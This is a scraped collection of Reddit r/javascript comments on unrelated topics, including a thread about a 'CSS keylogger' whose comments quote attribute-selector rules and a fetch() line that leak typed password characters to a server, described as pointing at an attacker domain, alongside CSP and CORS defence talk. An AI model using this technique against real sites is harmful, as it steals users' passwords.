It sounds like you want to create a traditional server-rendered site that will just output static html to a user. NodeJS is the tool you'll want to use to do this. NodeJS lets you run javascript files as normal programs on your computer (a bit like python), instead of in the browser. Since you want a very simple front end, you don't need to worry about any fancy JS things in the browser yet (like React or Babel). NodeJS is normally used to create web servers, and is one of the most popular frameworks for this. NodeJS provides a basic environment to write your web server in. Along with NodeJS you'll want to use a couple of other helper libraries. The first one is [Express](https://expressjs.com/). This is a library that will help you create the different routes for your web server. The routes look like this: // blog admin page app.get('/admin', (req, res) =&gt; { // render `admin.ejs` with the list of posts res.render('admin', { posts: posts }) }); The second library is [EJS](http://ejs.co/). This library let's you create templates for different web pages. The templates are basically HTML files, except that you can include variables from the server in them. This let's you generate different HTML for different users based on what's in your database. EJS files contain stuff like &lt;div&gt; &lt;%= author.name %&gt; &lt;/div&gt; The last thing you'll need is a library to let you query your database. MySQL is a pretty good database to start with, although PostgreSQL is popular with Node developers and you could also experiment with externally hosted databases like Firebase. For MySQL I recommend [mysqlJS](https://github.com/mysqljs/mysql), it's pretty simple and straightforward to use. You could also try a full ORM like [Sequelize](http://docs.sequelizejs.com/). Node, Express, EJS, and MySQL are a pretty common combination, so there a bunch of tutorials to help you get started. Here's one found pretty quickly: https://coligo.io/templating-node-and-express-apps-with-ejs/
Thanks!
Hi /u/RedditGeneralUser, For javascript help, please visit /r/LearnJavascript. Thank you!
Hi /u/ArccadeMonkey, For javascript help, please visit /r/LearnJavascript. Thank you!
Hi /u/Sobbles, For javascript help, please visit /r/LearnJavascript. Thank you!
I'm a typescript guy (or any statically typed language) so I view stringly typed as the single worst thing possible. The potential to make typos that are difficult to find is just too high for me.
this is so hilariously simple - has anyone thought of this before or is this a poc? i wonder if less/sass have support for wildcard substitution
Correct. But [slice](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/slice) accepts a negative end index which should get you what you want.
Lol. It's employed, it just doesnt give any errors. Might be because I'm wrong. Here's the jsfiddle code: https://jsfiddle.net/ra608rvL/4/
Great, but wouldn’t the site itself have to be malicious to use this? Then it can just spy the password directly without needing css.
surprisingly simple, and a little scary. 
Definitely agree with this. After writing a large project that heavily uses `propOr` and `pathOr` from ramda we have unknowingly hidden a lot of issues with the data contract. We used it as a crutch instead of doing proper up front data normalization and now we are kicking ourselves and refactoring a big part of the app to help fix these issues. I'm in favor of this feature, its just easy to abuse.
Well, or the site uses some third part CSS/library
I agree with others that this kind of code can be a code smell. But I'm often dealing with APIs where fields may or may not be present in which case this operator would be very helpful in reducing clutter.
Now I can remember all my passwords because of this!
Technically someone could include it in some sort of CSS framework. People using the framework would have a false sense of security because it's not a JS file.
Or it's present in a chrome extension you install. 
You're reading the file in your webpack configuration file, which is only run once when webpack starts. So you won't get an updated fragment unless you restart the webpack process. You could use something like nodemon to restart the process whenever your watched file (fragment.html) changes. 
ouch
Agreed.
You probably shouldn't call a class member function from a different context anyway. Why do you need this? For callbacks you can use `functionThatTakesCallback(() =&gt; this.method());` instead of `functionThatTakesCallback(this.method);`
Wouldn't that css only trigger where the password field included the single character listed in the file? for example these few lines LOOK like it would only trigger with the exact value. input[type="password"][value$="A"] { background-image: url("http://localhost:3000/A"); } input[type="password"][value$="B"] { background-image: url("http://localhost:3000/B"); } input[type="password"][value$="C"] { background-image: url("http://localhost:3000/C"); } input[type="password"][value$="D"] { background-image: url("http://localhost:3000/D"); } input[type="password"][value$="E"] { background-image: url("http://localhost:3000/E"); } input[type="password"][value$="F"] { background-image: url("http://localhost:3000/F"); }
or some jabroni who still thinks HTTP is fine for static assets gets MITM'd
Cors only though
Surprisingly not. And that is what makes this so dangerous. Instagram does protect itself from CORS and injecting javascript will fail because of this. But clearly, css does not.
$= is last character, not exact value
Good find. A must fix 
The `value$="A"` checks if the value attribute ends with an `A`. As you type, different selectors will be activated and send their respective requests. The job of the malicious back-end is to piece together the requests to represent a password. More information about attribute selectors can be found here: https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors
Pretty sure this one will stick: * solves a common pain point * makes sense in both OO and functional contexts * similar syntax is present in multiple languages * transpiration produces very little ES5, so it is likely that the engine makers won't have too hard a job to implement it. 
Hey wow so simple. Not bad:) 
Let's not get it twisted: the simplicity is in syntax only. Cyclomatic complexity checkers still report each `?.` as a branch because they ultimately expand out to a deeply-nested `if` statement (technically deeply-nested ternaries since they're expressions). Add to that the fact that people use them multiple times per function, and quickly the execution path becomes deceptively complex. 
Was thinking the same thing.
Right, but without the syntactic sugar, I've seen plenty of situations where developers simply don't do the checks, and then null reference exceptions litter the logs. It makes devs more likely to account for the potential null.
Spent a solid 10 seconds just staring at the screen saying wow
This exploit loads an external resource for it to work, and reddit custom CSS only allows files stored on reddit (and moderators can upload images to the subreddit for that purpose). So reddit CSS shouldn't be able to use this exploit. 
Or an npm package the developer of the site installed.
Regex101.com
That is the intention, but his selector is saying: const getResources = state =&gt; state.resources Each resource has an "id" - maybe later on he updates this to "resourceId" in the store. Yes he can now update the selector to map through each resource and convert "resourceId" to "id", but a better change with less code overall is to change the ui code from "id" to "resourceId" (this is how he would have written it in the first place if he had originally called it "resourceId" right?). At the end of the day saying selectors are a must is building your project with a mindset of handling future use cases which may or may not happen. Build your system to do just what it needs, nothing more and nothing less.
how many parts of that library do you actually use, though? it seems really overkill. 
I recommend adding a library to the list of tools which I have just built and which was announced here on Reddit a few days ago: https://EasyPZ.io, a pan and zoom Js library for mobile and desktop! Reddit post here: https://www.reddit.com/r/javascript/comments/7yqifx/easypzjs_make_every_visualization_you_see/ It can be used to automatically scale SVG elements, and can be used to manually rescale any elements as desired, eg in canvas.
I'm not sure why this is a problem. You have to somehow run your css code on a third party's website. You can do the same thing with JavaScript. fetch("http://localhost:3000/" + document.getElementById("passwordInput"))
I think if you host it locally and use CSP you could prevent this even without examining the CSS.
You have to use .filter properly, the code I posted before just showed you how to get a collection of the good lines in the &lt;p&gt;. You're not even calling the function in the first place, so there's no reason for anything to happen even if the .filter was properly fleshed out. I highly recommend getting a basic grasp on elementary JS before asking for help on why things don't work. A good tutorial is: http://eloquentjavascript.net/
Slice is the clearest option, but even if it wasn't, you can just use two lines instead of one: const splits = ctx.request.body.url.split('/'); const filename = splits[splits.length-1]; Nothing wrong with declaring another variable just in order to more easily extract information out of it
Good find. Since there is no sane reason why password field should be styled on value browser vendors need to fix this, like, yesterday. 
Good point. We should start blocking CSS with CORS as well. 
This is why CSP exist
If he used that selector in 10 different UI components, that's 10 different changes vs doing that 1 conversion map `resourceId` -&gt; `id` in a selector. That's less code at the expense of "naming it correctly". Maybe it is worth renaming all the 10 UI components but it's up to you and at least with selectors you have the choice vs. no choice. I pick choice :P
Don’t worry guys! Just turn off js in your browser and you’ll be safe! &lt;/sarcasm&gt;
OP, you should consider separating your "custom base library" into a separate project/repo. Bundle it before distributing (via npm or if you don't want it public you can just npm install from the repository). Part of your problem is definitely that you are doing too many things in your build process.
Well... This is lovely for CMS that allow custom css...
Okay, I'm still living in a happy untyped land of whateverness, so less of an issue here probably.
So if I paste my password into the box with Ctl+V, that should avoid this exploit, right?
Correct! But there are other attribute selectors. For example [input*=value] checks if input contains value. Although this would not show the order of the password, it would reveal its contents. 
I think this is the only time an in-line !important would be an acceptable fix.
This is slick but the username is unknown. 
The codebase is in a better spot by keeping property names consistent throughout. 
Good to know coming from a recruitment place, thanks.
Would they actually get any useful data? Or would they just get bombarded with more data than they could make sense out of? Unless this type of attack is targeted at a single, or small number of users, it doesn't seem to me like it would be useful to anybody.
IP Address or Cookie, trivial
Have you ever seen stylish or tampermonkey? Just provide a very nice YouTube theme and users will throw your passwords at it.
PS: it seems there's a max zoom factor in easypz.js examples, like x10 or x100. Would you know how to change this to `10^100`(like in my bigpicture lib). If so, I'd like to mix ideas from both projects to make it work on mobile too. Also, something else: have you tried to create a modifiable textbox on your canvas? When I tried this a few years ago, no editable textbox with a nice UI was really available out-of-the-box on a canvas. For this, we would need to recode everything (displaying text, then replacing it by a textbox when opening the box, then implementing selection, copy/paste, etc.)
just rename the text file to the .html extension
Or a site that allows custom CSS, like reddit, but [according to this](https://www.reddit.com/r/javascript/comments/7yy92p/a_css_keylogger/duk7ls6/) (I haven't tested it myself), this doesn't work on reddit.
If you can run JS on the site, you don't need any of this CSS trickery.
In the documentation: &gt; Using a simple script one can create a css file that will send a custom request for every ASCII character.
I wouldn't call it a piece of crap just because no one's thought of it before...
So? By the time you start typing your password, it's already rendered. Can you show a simple example of it working on JSFiddle?
Nice website and great example! Do I understand the page correctly in that you try to scale only those elements currently visible on the screen? I'm happy to chat!
This is not a CSS problem, this is an Instagram (and likely other sites) problem. The only reason this works at all is that the value is being bound to the value **attribute** as you type, which is accessible via CSS. But this behavior isn't part of HTML - see [this example](https://jsfiddle.net/wpnn9tra/1/) and watch how the value attribute does not update
What if I don't use type="password" for password forms? I'll lose input obscuring and password managing?
Fails against a HSTS that doesn't include the malicious url. Also backspacing during the sequence throws things off a bit. Otherwise, super spooky.
I slip this into a Chrome extension or npm manager or something, changing `localhost:3000` to `myevilhackersite.com`. Then, as you type each letter of your password, the CSS tries to load an image from my site with that file name, until I have your entire password spelled out in failed HTTP requests for background images to my site: http://myevilhackersite.com/h http://myevilhackersite.com/u http://myevilhackersite.com/n http://myevilhackersite.com/t http://myevilhackersite.com/e http://myevilhackersite.com/r http://myevilhackersite.com/2
I think you're definitely hitting on something. I'm at the start of a code rework and knew that in the code there were a few, legitimate IMO, uses of this nested object checking that at the time I worked carefully to ensure were legitimate and not bad design, but I was excited to replace them with something more convenient. But as I started coding I completely and inappropriately started dropping this new syntax in everywhere because I wanted to. It does make it *slightly* too easy, especially because it looks so similar to a regular nested accessor. That said, still looks/functions well where rarely required. But this is where we can actually think flip this in a positive manner. This syntax + a warn lint rule == even better than before. Looks beautiful AND forces me to think it through before I lint-disable that warn. 
Same w/ a password manager.
According to MDN, CORS [does block stylesheets](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#What_requests_use_CORS). &gt; block any JavaScript injected from a chrome extension Technically, the javascript will run, it just won't be able to communicate with anything not declared in the CORS headers.
I didn't see CORS headers on instagram.com when I inspected just now. I did for facebook.com though.
But CORS headers on instagram.com would disallow _other_ sites from referencing resources on instagram.com, not outgoing requests from clients on instagram.com to other sites. What you are describing sounds like [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP). The injection from an extension would execute the javascript either way, but with CSP you could restrict the domains it can reach, this blocking the exfiltration part.
&gt; Cors CORS headers on instagram.com would disallow other sites from referencing resources on instagram.com, not outgoing requests from clients on instagram.com to other sites. What you are describing sounds like CSP. The injection from an extension would execute the javascript either way, but with CSP you could restrict the domains it can reach, this blocking the exfiltration part.
This is the correct answer. Try inspecting the password field and you'll see that reddit, facebook, etc do not have or update a value="" field. Without that you can't match the password with CSS.
Needs more upvotes. CORS won't help (either with injected CSS or JS from extension) but CSP would stop exfiltration.
Yeah it's a bit odd that you would update the inputs value attribute..
Isn't this as much of a risk as script injection? Or, if the risk is that a UI framework can inject this, then isn't this as much as a risk as ANY front\-end library you get from NPM or bower or a CDN or w/e? Or is the focus that it's CSS and people automatically think CSS is safe?
Overall good article. Since ES6, sum types (aka tagged or discriminated unions) might be easier than we previously thought to implement in JS even without the aid of a library. Here's a couple alternate implementation ideas. &gt; We have failed to truly create a sum type, as our rectangle and circle instances do not know they are shapes! This makes it difficult to specify that a function should receive any shape. We could manually write if (arg.tag !== CircleTag &amp;&amp; arg.tag !== RectangleTag) in such a function, but that is brittle; what if we added a triangle case later? Perhaps a little ironically, inheritance could be of help here. Instead of tags being symbols, they could be class instances. That would allow your CircleTag and RectangleTag to inherit from a ShapeTag, then a function expecting a shape could ask `if (arg.tag instanceof ShapeTag)`. const ShapeTag = class {}; const CircleTag = class extends ShapeTag {}; const RectangleTag = class extends ShapeTag {}; const Shape = { Circle: (center, radius) =&gt; { if (!(center.tag instanceof PointTag)) throw TypeError('center must be a Point') if (typeof radius !== 'number') throw TypeError('radius must be a Number') return { center, radius, tag: new CircleTag } }, Rectangle: (corner1, corner2) =&gt; { if (!(corner1.tag instanceof PointTag)) throw TypeError('corner1 must be a Point') if (!(corner2.tag instanceof PointTag)) throw TypeError('corner2 must be a Point') return { corner1, corner2, tag: new RectangleTag } } } ---- &gt; Pattern matching is a language-supported syntax for doing two things at once: identifying which case a value represents, and extracting the data from such a value. Pattern matching doesn't necessarily need to be a language-supported feature. It can be implemented pretty cleanly as a library. For example, a [variant in C++](http://www.boost.org/doc/libs/1_66_0/doc/html/variant.html) works that way \(scroll to the very bottom on that page; sorry I couldn't link to a heading directly\). We could probably do the same in JavaScript with WeakMaps, where the keys are the tags and the values are functions to handled the associated tagged type. const areaVisitor = new WeakMap([ [CircleTag, (circle) =&gt; 3.14 * circle.radius], [RectangleTag, (rectangle) =&gt; { let width = Math.abs(rectangle.corner2.x - rectangle.corner1.x); let height = Math.abs(rectangle.corner2.y - rectangle.corner1.y); return width * height; }] ]); console.log(areaVisitor.get(circ1.tag.constructor)(circ1)); console.log(areaVisitor.get(rect1.tag.constructor)(rect1)); (This code of course is still assuming the tags are class instances, hence the `.constructor` part.) A one-line helper function can pretty this up a bit. const applyVisitor = (visitor, operand) =&gt; visitor.get(operand.tag.constructor)(operand); console.log(applyVisitor(areaVisitor, circ1)); console.log(applyVisitor(areaVisitor, rect1));
This is great, you could supplement an email input and have them target different routes, then combine them based on the ip. 
React. 
Some people style when an input is empty
That sounds reasonable, but has anyone checked if browsers handle this differently, say some OS that handles pastes character by character? I would hope the images are loaded based on rule order, but not sure that always happens. 
Why did you need to use a chrome extention for this? 
Why not just pass two arguments because that is obviously the cleanest approach, instead of nesting another function inside another function. Not just that it's not a usual/clean method, but it's also unreadable given a bit more complexity. You can either pass more than one argument, or encapsulate each argument on an array and then just spread it like a peanut butter.
I'm not sure if /s but poc = proof of concept
You are right on track. You may want to just save that array onto either your database or browser local storage to load it upon refresh.
I'm surprised I am surviving on my Pentium G3260 and 4GB RAM workstation doing mostly javascript, html and css -- but also ASP.NET MVC and SQL Server when needed.
They are the same thing, but using the array as a function parameter rather than using the outer variable name makes for a (more) pure, more composable function.
We usually store UI text on a javascript object and load it on run time. We have like { 'en': {1: 'Open', 2: 'Close', 3: 'Ok'}, 'jp': {1: '開', 2: '閉める', 3: 'Ok'} } Then we have a script to get the browser language from window.navigator or whatever it is. Then we load this object and inject each values in our UI
I see thanks
It can also save you from having to define another variable in the outer scope in the case that the array is an intermediate value and not a standalone variable, eg: `Array.from(document.querySelectorAll('#container &gt; a')).reduce(`
It doesn't matter much for inline anonymous functions, but consider this scenario: const doFoo = (value, index, arr) =&gt; { // myArray isn't available here, but you can still use arr }; const myArray = [1, 2, 3]; myArray.forEach(doFoo); Basically it allows you to reuse that function without the hard requirement of closing over the array. 
/joke
&gt; Perhaps a little ironically, inheritance could be of help here. Oh, definitely! I'm not a priori against leveraging OO to help out where it makes sense. In the article I left off attempting to solve all possible problems because I wanted to review what was already out there, but writing this article made me want to start coding out a solution myself and see where I end up. I'll be considering inheritance, though I suspect judicious use of closures will also yield dividends. I haven't yet trawled the source code of any of the libraries I reviewed, just their APIs, so it will be interesting to compare implementation details at some point. &gt; Pattern matching doesn't necessarily need to be a language-supported feature. It can be implemented pretty cleanly as a library. For example, a variant in C++ works that way Ah interesting, I hadn't thought of it that way. Will take a closer look. Thanks for the comments, they are helpful. Cheers, —G.
Will this also happen for svg files? filter: url(domain.com/name.svg)
it was good joke
1. I think you're unintentionally mixing objects and arrays. In your first example, assuming `arrayOfObjects` is `['test', 'cat', 'dog']` from your other example: const arrayOfObjects = ['test', 'cat', 'dog'] pipe( checkThemTrue, // step 1 -&gt; { 0: 'test', 1: 'cat', 2: 'dog', checked: true } checkThemFalse // step 2 -&gt; { 0: 'test', 1: 'cat', 2: 'dog', checked: false } )(arrayOfObjects) // result -&gt; { 0: 'test', 1: 'cat', 2: 'dog', checked: false } 2. Using a curried version of `hasValue` is correct. If you want it to read more clearly, you could assign the partial function to a variable: const hasTest = hasValue('test'); 3. I'm making a ton of assumptions here, but what I *think* you're after is trying to get your `pipe`d function working over arrays of objects. For that, you'd need curried `map`. Additionally, you're trying to preserve all objects in an array while returning new copies of only some of them. For that type of operation, you need the helper functions `when`, `unless`, or `ifElse`: const map = f =&gt; a =&gt; a.map(f); const when = pred =&gt; onTrue =&gt; val =&gt; pred(val) ? onTrue(val) : val; And then, all together, I think you'd end up with something like: // assumptions: // checkFalse takes one object and adds key: checked with value: false // checkTrue does the same thing, but true // hasValue is meant to check the existence of a value for arg key, // so hasValue('test')(obj) is the same as obj.test != null pipe(map(checkFalse), map(when(hasValue('test'), checkTrue)))(arrayOfObjects); // refactored by composition law map(pipe(checkFalse, when(hasValue('test'), checkTrue)))(arrayOfObjects); // refactor for clarity const markTestChecked = pipe( checkFalse, when( hasValue('test'), checkTrue ) ); const markTestArrayChecked = map(markTestObjectChecked); const arrayOfObjects = [ { value: 'foo', test: true }, { value: 'bar' }, { value: 'baz', test: false } ]; markTestArrayChecked(arrayOfObjects); // result: [ // { value: 'foo', test: true, checked: true }, // { value: 'bar', checked: false }, // { value: 'baz', test: false, checked: true } // ]; 
I mean I certainly wouldn't react a *bad* framework haha
You're correct.
See this condition `if(gp.buttons[i].pressed)` Off the top of my head, I'd set it up so that the currently pressed buttons are put in an object that's accessed on the next reportOnGamepad(), which will let you see which (if any) buttons have changed their pressed status.
&gt;Also, I haven't verified this but I think it would be immune to sequences of the same letter. Could hard code in some amount of repeating characters to overcome this though. There's also obviously no guarantee that the requests will arrive in order, so you kinda have to do some post-processing on what your results either way (to rearrange or duplicate characters).
[Here](https://codepen.io/seanroche/pen/ZroQZJ) is an example. Open the dev tools console and you will see when you press and release a keyboard button. if you comment out line `5: if(keysPressed.includes(key)) return;` and hold, you will see it keep appending the keypress to the array. Just translate it to button presses. Although like /u/CertainPerformance suggested, an object would be better to use with true false, so if you were using a dualshock 4 controller you could do const pressed = { cross: false, square: false, circle: false, triangle: false }; then set it true on down, do the checks on the loop and return to false on up.
I would say, return an image for them. Giving errors mights cause someone to notice more likely.
Swift and Rust have Optional chaining. Bringing it to JS would be a real pleasure. Combine that with functional programming and immutable data structures. Null might be a thing of the past. 
Oh definitely, if you want to actually hack someone with this. =D But, you know. Don't do that.
Example of such a popup?
You can do that with Proxy: https://codepen.io/anon/pen/QQrNmq?editors=1111 ...except direct property assignment due to semantics. I also didn't add a way to back-track but that would be trivial.
Bad in that it's unnecessarily writing attributes to the dom. Both less performant and less secure in this particular case 
The type of person who would notice an image being requested and not returning would most definitely notice the suspiciousness of the requests.
True, but can't the same be done for this optional chaining feature as well? Also the classlist part is a bit dirty, since it's no longer part of the cascade. You can't do ..classlist.add('lol') ..setAttribute('whatever', 'whatever') after it. I've always felt like using functions like this for this problem seems overkill. I probably wouldn't do it in my code. One less dependency.
That's what I meant with the back-tracking. I like being able to traverse arbitrarily down the tree. You could add an explicit pop function, or perhaps keep track of the applications and pop back to the point you were at before going.down.a.chain.
Just came here to ask about that angle.
Thanks.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [airbnb/javascript/.../**README.md#modules--imports-first** (master → 3c3074e)](https://github.com/airbnb/javascript/blob/3c3074e502dc9ebc7dbdad372df474e49f52d512/README.md#modules--imports-first) ---- [^delete](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dul56wi.)
You could easily inject a `&lt;script&gt;` tag instead which should not get blocked by CORS, wouldn't it? I mean that's the foundation of [JSONP](https://en.wikipedia.org/wiki/JSONP)'s implementation. As far as I can see, as long as a malicious party can inject JS code to your side you're screwed in every possible way. They could also add new `&lt;img&gt;` tags to your page with the malicious URL as the image source. The only way the CSS attack can be worse is because people likely have somewhat lower security standards for CSS and are more open to download stuff over HTTP or from CDNs.
It does make sense also if you for instance, filter or map the array before using forEach in a chain. 
Since there's no gamepad event when a gamepad button is held or released, gamepad status must be read periodically. Thus, the status of a gamepad button or axis may not change between the previous and current reading. So, if you only want some code to execute when a gamepad status is changed, you'll have to keep the current status to be compared with the next status reading. When a previous status exists, compare it with the current status. If they're different, it means that the status has changed, and you should then execute the code for e.g. start firing weapon or stop firing weapon.
Blocking third party CSS and images now, for my uMatrix.
I don't know.. if I am able to make the user load this client side data, shouldn't I be able to do it a easier way? Of course you always should take this in your mind that this is possible with CSS too and not only other script languages, but in the end you shouldn't blindly use other sources. 
&lt;dialog&gt; is really new and is not widely supported yet: https://caniuse.com/#feat=dialog so it would require another polyfill, but not only on IE this time. In the meantime, role='dialog" is a well-known ARIA attribute that works very well. So, one day probably, but it seems premature now.
In any case, most (99%) of the times you should **not** reference the array inside a `forEach`/`map`/`filter`/`reduce`/etc. If you find yourself doing so, heavily consider there's a better way to do what you're trying to do.
It looks like the use case is for buttons that allow copying the text inside some other element.
ooh, well I thought we are talking about actionscript here.. (or whatever language it was) AFAIK the canvas doesnt have a way to animations with tweening etc in a deticated tool. Its pretty much just the presentation part youd have to write that yourself
I don't understand how co-locating actions with reducers make them less testable? Aren't they still just functions?
If I understand what you're saying (having setters/getters on the store instead of actions), you're probably right in terms of flux vs singleton. I think the difference for redux is that having internal logic mutating internal state is harder to understand than extracting the mutation logic into a separate function (which doesn't actually mutate it just creates a new version of the state). It's a case of encapsulating the concern so you don't end up with internal spaghetti. I've worked with some big apps using flux and you can end up with complicated stores no one want's to touch. 
 All I can see is http://myevilhackersite.com/* http://myevilhackersite.com/* http://myevilhackersite.com/* http://myevilhackersite.com/* http://myevilhackersite.com/* http://myevilhackersite.com/* http://myevilhackersite.com/* 
There are simple bundlers made for people who are mainly backend devs, which are nothing but mere wrappers over webpack: - https://laravel.com/docs/5.6/mix#vanilla-js (check the note on babel right under the vanilla section) - https://symfony.com/doc/master/frontend/encore/simple-example.html In very symfony fashion, it is config heavy, but the config options aren't that difficult to comprehend in one reading. If you're using Webstorm/PyCharm/Phpstorm etc from the Jetbrains suite, from memory I think there's a transpiler built in that will convert ES6+ code into ES5, but I don't think it's able to do the more recent things like generators and object spread syntax, it's been a while since I relied on those IDEs for webpack stuff.
I have a responsive dialog using &lt;dialog&gt; + polyfill and it works very nice on IE 10, FF, Edge, Chrome, Android ...
The idx macro for babel might be a little bit cooler because it has a smaller runtime perf drop and nicer syntax: https://github.com/dralletje/idx.macro/blob/master/README.md
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [dralletje/idx.macro/.../**README.md** (master → 528bdf4)](https://github.com/dralletje/idx.macro/blob/528bdf49f6f4fe3dd1d80d88f368aa1da02b1e88/README.md) ---- [^delete](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dul9vub.)
Here is a list of threads in other subreddits about the same content: |Title|Subreddit|Author|Time|Karma| |---|---|---|---|---| |[I wrote a Webpack Loader for Commonmark Markdown](https://www.reddit.com/r/webdev/comments/7z4avt/i_wrote_a_webpack_loader_for_commonmark_markdown/)|/r/webdev|/u/alexgrozav|2018-02-21 17:18:56|1| |[A Markdown Webpack Loader using Commonmark](https://www.reddit.com/r/webpack/comments/7z3xac/a_markdown_webpack_loader_using_commonmark/)|/r/webpack|/u/alexgrozav|2018-02-21 15:50:43|1| ---- I am a bot [FAQ](https://www.reddit.com/r/DuplicatesBot/wiki/index)-[Code](https://github.com/PokestarFan/DuplicateBot)-[Bugs](https://www.reddit.com/r/DuplicatesBot/comments/6ypgmx/bugs_and_problems/)-[Suggestions](https://www.reddit.com/r/DuplicatesBot/comments/6ypg85/suggestion_for_duplicatesbot/)-[Block user (op only)](https://www.reddit.com/message/compose/?to=DuplicatesBotBlocker&amp;subject=remove%20user&amp;message=alexgrozav)-[Block from subreddit (mods only)](https://www.reddit.com/message/compose/?to=DuplicatesBotBlocker&amp;subject=remove%20subreddit&amp;message=javascript) Now you can remove the comment by replying delete! (op only) 
Rollup + Buble - fuck this webpack shit.
Alaska looks fucking huge
Rollup is far superior than webpack and a hell of a lot faster. 
Mithril.js is all I ever seem to need. All the kids these days hype the fuck out of React, Vue and Angular but in truth they are major overkill’s imo. I always lean towards vanilla JS builds and when required will add in Mithril.js, which is minimal at production level. 
Autocorrect never fails to amuse :) 
Cool but I don't see it as a risk. You'd have to host it on a target's device or the web server and there's a thousand other ways you could steal your users' passwords or run keyloggers on a target's devices. I'd say it's a risk most companies wouldn't worry about.
Styling empty input doesn't require the rules used by this keylogger, you just need :empty :)
It will probably work, but you’d likely need to include all of the angular framework source as a dependency to your project, and make sure you hand off lifecycle responsibilities from react to angular correctly. It may not be worth it unless you have a project where angular is the new direction? I did this with Marionette -&gt; React only because we want to start using react in the future 
There are node packages which allow the use of angular 1.x components in react, and vice versa. I've migrated an angular 1.x app to react using these tools. You can have react components in angular components in react components. I'd give you the names but I don't have access at the moment.
I honestly don't understand why everyone is so impressed by this. The technical side of this is at least 10 years old and the treat of this is minimal.
I've never used Babel, but it could be overwriting the ES6 .js files when it generates the ES5 .js files. If you disable the Babel step, then after *tsc* generates the ES6 .js files they should be on your filesystem, most likely next each corresponding .ts file.
The company that created its own version of javascript, and was anti-anything not Microsoft created, the maker of the world's worst web browser. I can't think of a worse person or company to hae an AMA but here you are.
Really? It's own version of js? Do you even know what you are talking about? 
Thank you
But don’t leave the password hanging out in the ‘clipboard’ where it can be accessed by software and apps, right? Better to use a password manager that clears the clipboard after use, correct?
If you want to export your iterator function from a module and use it across 20 different files, it's much more preferable and practical to access the array through the function scope of the iterator rather than through module or global scope.
Start with https://www.typescriptlang.org/samples/index.html and/or https://github.com/TypeStrong/ts-loader I suggest dropping Babel and just using TS to compile to ES5 to get started. It's simpler and then you can use Babel when you really need
This comment is like the modern version of Rip Van Winkle, you must have fallen asleep in 2006
Don't paste code here if you can't format it, it's unreadable use JSFiddle or something instead. You shouldn't use spaces in IDs, use dashes instead.
I know this kind of problem is solved in stylus . Maybe this will give you another perspective: http://stylus-lang.com/docs/js.html#definename-node The advantage here is that the variables will be known at compile time, so you'll save yourself the overhead of parsing at runtime. As well as the additional css payload (the content) This is all assuming you have a build process of some kind.
I think at the point where your clipboard is compromised you should not being doing anything remotely sensitive on that machine.
The variable is part of the body of the function. It comes with the function when the function is exported. I am more curious what led to the question: what wasn’t working for you that made you believe that they would also need to be exported?
So why do you instruct Javascript when I have seen Typescript in Microsoft gihtub repo??
Did you pick JavaScript or did JavaScript pick you?
Hi Benjamin, thanks very much for this AMA! Have you ever taught a group of devs that are migrating from a structured language world, say ones with lot of years in C#/Java? Any tips on convincing / converting / easing up their mindset so they don't constantly fight with your instructions?
I’ve been thinking about moving to programming from systems administration. Is JS worth learning for noobs?
The content I create for Microsoft doesn't have to be a Microsoft created technology, such as TypeScript. I teach JavaScript because I that's what I enjoy learning about and it works out of the box.
This sounds reasonable. In the past new features were withdrawn despite being at a more advanced stage (Object.observe for instance)... and you usually don't want to find yourself in that situation.
I picked JavaScript =)
I actually was allowed to pick any technology to focus on when I first started my job and I picked JavaScript because I had an interest in diving deep into web development.
Hi Ben, where did you go to school for college? And what was your favorite part about it? 
How do you feel about Douglas Crawford's push to avoid the use of `this` and use parasitic inheritance?
What would you consider to be the trickiest or most-difficult-to-grasp part of JavaScript, even for professionals?
JavaScript is primarily used for web development so if you have a particular interest in learning web development you should try it out. JS is pretty noob friendly and there are a lot of online tutorials on how to use it. 
Are you excited for Blazor and you think it will shift a lot of the development away from JS and back to C#?
How do you feel about education vs. development? Your background (from what I can tell) seems to be in QA/development, and your contributions to MVA seem all to be within the past year. Are you trying to be an educator full time or is this just a side gig? Do you think you would prefer to be a full time educator?
That would probably be the asynchronous nature of JavaScript. Most people are used to a language that executes top to bottom and when they start off learning JavaScript they expect JavaScript to be the same. However, some operations such as network requests happen asynchronously, meaning that they get handled on a separate thread and the result is returned once it has completed. This throws off beginners who try to use the result of an asynchronous operation before it has finished completing.
What are some of the valuable lessons you've learned to-date working for Microsoft, doing what you do?
I went to college at Cal Poly San Luis Obispo and studied computer engineering. It was a great engineering school and it had a lot of focus on hands on learning. But overall, my favorite part was all of the lifelong friends I made.
Hi Benjamin. I would like to know if there are more resources for learning C#/.net geared towards JavaScript developers with front end and node experience. I know you’re focused on JavaScript, but my company uses .net and it would be great to be more fullstack. I have done a few pluralsight and udemy courses but any additional recommendations are welcome. Thanks, MusicPants
Can you recommend any books or videos to learn JS? Thank you
ok, first of all, thank you very much for your detailed and thorough answer! Your assumptions are all correct even though I didn't give a full example because this problem of mine actually relates to multiple instances in the codebase I'm working in. second, you're exactly correct! I think I was missing the helper functions and the map I wanted to respond and thank you but i'm going to run through this all right now to make sure I get it all. Thanks again! 
Hi Benjamin, I have a few questions, some are very vague probably. - What's your opinion on redux/vuex like state management pattern? Do you think it is good as it is or are there any other patterns that you prefer? - I love JavaScript, I want to get better at it, but how do you measure your skill level? Like at what point would one be ready to get a job at MS? Is the knowledge of all the _advanced_ ES6/7 features (like generators, decorators, scoping, async await) and JavaScript's async nature, prototypes etc enough or do you need to know everything about what goes under the hood in JS engines? Or a top-level understanding of what goes under the hood is good enough (like how event loop works)? - How important in your opinion is learning DSA for a frontend developer?
I've never taught a group of experienced devs switching to JavaScript but I have taught JavaScript to a group college students that primarily knew Java. As for tips on convincing experienced devs on adopting JavaScript, explain the pros and cons of JavaScript(rapid development, loosely typed variables, etc.) so they understand that it might not be the best solution for all their needs but it might be the best solution for some of their needs.
Excuse my English language, it is not my first language. I am genuinely interested in what you think of the 70-480 exam!
